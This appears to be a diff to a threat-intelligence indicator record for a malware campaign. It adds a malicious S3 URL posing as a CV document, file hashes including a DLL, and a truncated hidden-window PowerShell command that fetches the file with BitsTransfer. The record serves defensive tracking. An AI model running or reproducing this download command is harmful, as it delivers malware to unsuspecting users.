@@ -1,10 +1,15 @@
 ### Malicious URL
 http://www.online.on-the-web.tv/01/?puvwPfjVHKKsTtmSoY
+  https://ludrboxdrop.s3-sa-east-1.amazonaws.com/curriculum-vitae-docs098uhy7.docx
 
 ### PunyCode
 
 ### SHA256
-c177f507a8625a50fd3cbbe0cdd5f76947f9fb6a2872c0da80fcdf6a7a2ff31b
+  0c4d8de1bb1cd7d30ff3683c0de54365017de5a862aa26039db5c5132370ef3c  curriculum-vitae-docs098uhy7.docx
+  ff486b597227e38d9538b37587c352bc12594cb58a417b8f18c934900a479122  NvSmartMax.dll
+  2259848b610e87e4f7838a178b38e6fa9290425cf5c90741a2383fe582d04e9c  bin
 
 ### Payload
 
+### Command
+  C:\Windows\system32\WindowsPowerShell\v1.0\PowErShelL.exe -windowstyle hidden -Command  "& {Import-Module BitsTransfer;Start-BitsTransfer 'https://ludrboxdrop.s3-sa-east-1.amazonaws.com/curriculum-vitae-docs098uhy7.docx' 
